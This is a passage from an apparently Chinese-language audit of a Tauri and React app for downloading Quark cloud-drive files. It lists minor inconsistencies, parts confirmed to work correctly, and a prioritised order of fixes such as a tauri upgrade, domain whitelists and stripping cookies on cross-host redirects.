14. **脚手架残留会进入产物**：`frontend/index.html:7` `<title>frontend</title>`（已经进入 `frontend/dist/index.html`）、`:2` `lang="en"`（界面全中文）、`:5` favicon 用 `public/vite.svg`、未使用的 `src/assets/react.svg`、从未被 import 的 `src/App.css`。
15. **杂项不一致**：`frontend/package.json:4` 版本 `0.0.0` 与其余三处的 `0.1.0` 不一致；根 `package.json:25` 的 `concurrently` 没有任何脚本使用（却是每次 CI 都要装的依赖）；`LICENSE:3` 署名 "IsNull" 与 `Cargo.toml:5` 的 `quark-team` 不同；`capabilities/default.json:13` 的 `core:window:allow-is-maximized` 已被 `core:default` 内的 `core:window:default` 覆盖，属冗余授权。

---

## 五、已实测/已确认正常的部分（避免误报）

- `npm run build` 通过：`tsc -b` 无类型错误，`vite build` 成功（5.13s，2277 modules）。`tsc -p tsconfig.app.json --noEmit` 退出码 0。
- 无 XSS 注入面：`frontend/src` 内没有 `dangerouslySetInnerHTML` / `innerHTML` / `eval`，远端字符串（文件名、昵称、错误消息）都以 React 文本节点渲染。
- `tailwindcss-animate` 生效：产物 CSS 中存在 `animate-in` / `fade-in-0`，`glass-effect` / `gradient-text` 等自定义类也已生成。
- `capabilities/default.json` 与 `TitleBar.tsx` 实际调用的窗口 API（minimize / toggle-maximize / is-maximized / close / start-dragging）以及 `os:default`（`plugin-os` 的 `platform()`）完全对应，没有权限缺失。
- 分片区间算法本身正确：`main.rs:254-264` 生成的区间连续、不重叠、完整覆盖 `0..total_size-1`（仅在 `thread_count > total_size` 时才会下溢，当前不可达，见第 30 条）。
- 取消机制（epoch 计数）设计合理：`main.rs:16-21` 用代际号而非标志位，天然规避竞态；`download_single` 取消时会删除半成品文件（`main.rs:514-518`），多线程取消时会清理临时目录（`main.rs:350-360`）。
- 前端与后端的字段契约一致：`status`/`code`/`data.list`/`stoken`/`task_id`/`save_as_top_fids`/`download_url`/`use_capacity`/`total_capacity`/`service_ticket` 都与代理透传的夸克响应体吻合；`parseShareUrl` 的正则对 `/s/<id>?pwd=xxxx`、`#/list/share/<fid>` 均正确。
- `reqwest` 用了 `default-features = false`（无 gzip 自动解压）并显式 `Accept-Encoding: identity`，`Content-Length` 与实际字节数不会因压缩而错位。
- CI 的 `--target` 写法正确（tauri-action 的 `args` 直接拼给 CLI），`swatinem/rust-cache` 的 `workspaces: src-tauri -> target` 也正确。

---

## 六、建议的修复顺序

1. **P0-0（最优先，改动最小、收益最大）**：`tauri` 升到 ≥ 2.11.1 并更新 `Cargo.lock`；`on_navigation` 加来源白名单；补 `AppManifest`；`download_file` 对 `url` 做 CDN 域名白名单、对 `filename` 只取 basename。
2. **P0-1 ~ P0-4**：分片/最终文件长度与 `Content-Range` 校验、输出路径原子化、文件名清洗、失败批次不再报成功 —— 这几条直接决定"下下来的文件对不对"。
3. **P0-5**：默认线程数与 UI 范围统一（8~32），README 同步。
4. **P1-6 / P1-7 / P1-8**：加取消按钮、把进度监听上移、`finally` 里清 `loading` —— 都是小改动、高感知。
5. **P1-9 ~ P1-11 + 第 7 条**：动态端口、复用 `reqwest::Client`、补超时（同时让取消能打断阻塞的读）。
6. **P1-12 ~ P1-15**：Cookie 校验前不落盘、CORS/CSP、删掉未用的 shell 插件与权限、修 `--target`。
7. **第 33 条（跨主机重定向剥离 Cookie）**：属于凭据泄露，建议与 P1 一起做。
8. **P3-1 / P3-2**：立刻补 `.gitignore`（避免把 154 MB `node_modules` 提交进历史）并修 lint。
9. 其余按 P2 / P3 逐条处理，并补上分片下载与 `resolve_save_path` 的单元测试。
